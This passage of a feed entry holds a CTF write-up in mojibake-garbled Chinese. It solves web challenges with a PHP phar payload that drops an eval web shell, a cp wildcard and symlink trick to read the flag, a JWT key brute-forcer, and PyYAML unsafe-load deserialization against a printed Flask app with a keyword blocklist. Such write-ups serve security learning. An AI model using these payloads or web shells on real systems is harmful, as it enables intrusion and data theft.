class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"It is file"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You can look at the others"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">52</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"str too long"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€çœ¼æ‰“ phar.gz åŒ…å«ï¼Œgzip å‹ç¼©ç»•è¿‡</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exploit.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stub</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token string single-quoted-string">'STUB'</span><span class="token operator">&lt;</span><span class="token operator">?</span>php    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo "&lt;?php eval(\$_POST[0]); ?>" > /var/www/html/1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>STUB;$phar->setStub($stub);$phar->addFromString('test.txt', 'test');$phar->stopBuffering();?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå¦å¤–ä¸‰ä¸ªç±»ä¸éœ€è¦äº†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Acheron</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mode</span><span class="token operator">=</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Acheron</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†™å…¥å¹¶åŒ…å«</p><p><img src="/blog/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/IMG-20250908210600047.png"></p><p><img src="/blog/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/IMG-20250908210922151.png"></p><p>æ­¤æ—¶å°±å†™ shell åˆ° 1.php äº†ï¼Œantsword è¿ä¸Šå»</p><p>å‘ç° flag æ²¡æƒé™è¯»ï¼Œä½†æ˜¯æ ¹ç›®å½•æœ‰ run.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> /var/www/html/<span class="token keyword">while</span> <span class="token builtin class-name">:</span><span class="token keyword">do</span>    <span class="token function">cp</span> <span class="token parameter variable">-P</span> * /var/www/html/backup/    <span class="token function">chmod</span> <span class="token number">755</span> <span class="token parameter variable">-R</span> /var/www/html/backup/    <span class="token function">sleep</span> <span class="token number">10</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»å…¸é€šé…ç¬¦åœ¨é‡æ³¨å…¥ï¼Œåœ¨ &#x2F;var&#x2F;www&#x2F;html ä¸‹æ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">""</span><span class="token operator">></span><span class="token string">'-L'</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /flag flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶å flag å°±åœ¨ backup é•¿å‡ºæ¥äº†</p><hr><h1 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h1><p>ç»™äº†ä¸€ä¸ªæ‰§è¡Œ pyyaml å’Œ python ä»£ç çš„åŠŸèƒ½ï¼Œä½†æ˜¯åªæœ‰ admin æ‰ä½¿ç”¨</p><p>é‚£ä¹ˆéœ€è¦å…ˆæå®š jwtï¼Œåœ¨ &#x2F;sandbox è·¯ç”±æ•…æ„ä¿®æ”¹ jwt ä¸ºé”™è¯¯æ ¼å¼è§¦å‘æŠ¥é”™ï¼Œè¿”å›ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"error"</span><span class="token operator">:</span><span class="token string">"JWT Decode Failed. Key Hint"</span><span class="token punctuation">,</span><span class="token property">"hint"</span><span class="token operator">:</span><span class="token string">"Key starts with \"@o70xO$0%#qR9#**\". The 2 missing chars are alphanumeric (letters and numbers)."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ„æ€å°±æ˜¯è¦çˆ†ç ´ key çš„åä¸¤ä½ï¼ŒèŒƒå›´åœ¨å­—æ¯å’Œæ•°å­—é‡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    known_part <span class="token operator">=</span> <span class="token string">"@o70xO$0%#qR9#"</span>    token <span class="token operator">=</span> <span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E"</span>        chars <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits        <span class="token keyword">for</span> c1 <span class="token keyword">in</span> chars<span class="token punctuation">:</span>        <span class="token keyword">for</span> c2 <span class="token keyword">in</span> chars<span class="token punctuation">:</span>            key <span class="token operator">=</span> known_part <span class="token operator">+</span> c1 <span class="token operator">+</span> c2            <span class="token keyword">try</span><span class="token punctuation">:</span>                decoded <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"HS256"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found key: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Decoded payload: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>decoded<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>InvalidSignatureError<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found key: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Exception: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†ç ´å¾—åˆ° keyï¼š <code>@o70xO$0%#qR9#m0</code></p><p>é‚å¯ä»¥ä¼ªé€  jwt ä¼  yaml æ‰“ååºåˆ—åŒ–ï¼Œmkdir åˆ›å»º static æ–‡ä»¶å¤¹ç„¶åå†™å…¥é™æ€æ–‡ä»¶å¸¦å‡ºæ‰§è¡Œç»“æœ</p><p><img src="/blog/2025/09/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF2025/IMG-20250908204116198.png"></p><p>flag åœ¨ &#x2F;f1111ag</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> render_template_string<span class="token keyword">import</span> jwt<span class="token keyword">import</span> asyncio<span class="token keyword">import</span> yaml<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>JWT_SECRET <span class="token operator">=</span> <span class="token string">"@o70xO$0%#qR9#m0"</span>JWT_ALGO <span class="token operator">=</span> <span class="token string">"HS256"</span>FORBIDDEN <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token string">'write'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'communicate'</span><span class="token punctuation">,</span>             <span class="token string">'Popen'</span><span class="token punctuation">,</span> <span class="token string">'decode'</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">]</span>HTML_PAGE <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;!DOCTYPE html>&lt;html>&lt;head>    &lt;title>Vault&lt;/title>    &lt;style>        body &#123; font-family: "Segoe UI", sans-serif; background-color: #f4f4f4; padding: 40px; text-align: center; &#125;        #user-info &#123; margin-bottom: 40px; font-weight: bold; font-size: 18px; color: #333; &#125;        #sandbox-container &#123; margin-top: 30px; &#125;        select, input, button &#123; font-size: 16px; margin: 10px; padding: 8px; border-radius: 6px; border: 1px solid #ccc; &#125;        #result &#123; background: #222; color: #0f0; padding: 15px; width: 80%; margin: 20px auto; white-space: pre-wrap; border-radius: 8px; text-align: left; &#125;        button &#123; background-color: #4CAF50; color: white; border: none; cursor: pointer; &#125;        button:hover &#123; background-color: #45a049; &#125;        input[type="file"] &#123; display: block; margin: 10px auto; &#125;    &lt;/style>&lt;/head>&lt;body>    &lt;div id="user-info">Loading user info...&lt;/div>    &lt;div id="sandbox-container">        &lt;select id="mode">            &lt;option value="yaml" selected>YAML&lt;/option>            &lt;option value="python">Python&lt;/option>        &lt;/select>        &lt;br>        &lt;input type="file" id="codefile">        &lt;br>        &lt;button onclick="runCode()">â–¶ Execute from File&lt;/button>        &lt;pre id="result">Waiting for output...&lt;/pre>    &lt;/div>    &lt;script>        let token = "";        fetch("/auth")            .then(res => res.json())            .then(data => &#123;                token = data.token;                const payload = JSON.parse(atob(token.split('.')[1]));                document.getElementById("user-info").innerHTML =                    "&lt;span style='color:#444'>ğŸ‘¤ " + payload.username + "&lt;/span> | " +                    "&lt;span style='color:#4CAF50'>Role: " + payload.role + "&lt;/span>";            &#125;);        function runCode() &#123;            const fileInput = document.getElementById('codefile');            const mode = document.getElementById("mode").value;            if (fileInput.files.length === 0) &#123;                document.getElementById("result").textContent = '&#123;"error": "Please select a file to upload."&#125;';                return;            &#125;            const file = fileInput.files[0];            const formData = new FormData();            formData.append('codefile', file);            formData.append('mode', mode);            fetch("/sandbox", &#123;                method: "POST",                headers: &#123;                    "Authorization": "Bearer " + token                &#125;,                body: formData            &#125;)            .then(res => res.json())            .then(data => &#123;                document.getElementById("result").textContent = JSON.stringify(data, null, 2);            &#125;);        &#125;    &lt;/script>&lt;/body>&lt;/html>'''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>HTML_PAGE<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/auth'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">auth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># é»˜è®¤åˆ†å‘ä¸€ä¸ªä½æƒé™çš„ 'user' token</span>    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'guest'</span><span class="token punctuation">,</span> <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> JWT_SECRET<span class="token punctuation">,</span> algorithm<span class="token operator">=</span>JWT_ALGO<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        token <span class="token operator">=</span> token<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'token'</span><span class="token punctuation">:</span> token<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_code_safe</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token keyword">not</span> <span class="token builtin">any</span><span class="token punctuation">(</span>word <span class="token keyword">in</span> code <span class="token keyword">for</span> word <span class="token keyword">in</span> FORBIDDEN<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/sandbox'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    auth_header <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> auth_header<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Invalid token format'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">401</span>    token <span class="token operator">=</span> auth_header<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'codefile'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'No file part in the request'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'codefile'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'No file selected'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    mode <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'mode'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Could not read or decode file: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>token<span class="token punctuation">,</span> code<span class="token punctuation">,</span> mode<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Token, code, or mode is empty'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> JWT_SECRET<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span>JWT_ALGO<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        partial_key <span class="token operator">=</span> JWT_SECRET<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>            <span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'JWT Decode Failed. Key Hint'</span><span class="token punctuation">,</span>            <span class="token string">'hint'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Key starts with "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>partial_key<span class="token punctuation">&#125;</span></span><span class="token string">**". The 2 missing chars are alphanumeric (letters and numbers).'</span></span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'Permission Denied: admin only'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">403</span>    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'python'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> is_code_safe<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'forbidden keyword detected'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            scope <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> scope<span class="token punctuation">)</span>            result <span class="token operator">=</span> scope<span class="token punctuation">[</span><span class="token string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'result'</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span>    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">'yaml'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            obj <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>code<span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>UnsafeLoader<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'result'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'invalid mode'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä¸éš¾&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="Golang" scheme="http://c1oudfl0w0.github.io/blog/tags/Golang/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="Yaml" scheme="http://c1oudfl0w0.github.io/blog/tags/Yaml/"/>
    
  </entry>
  
</feed>
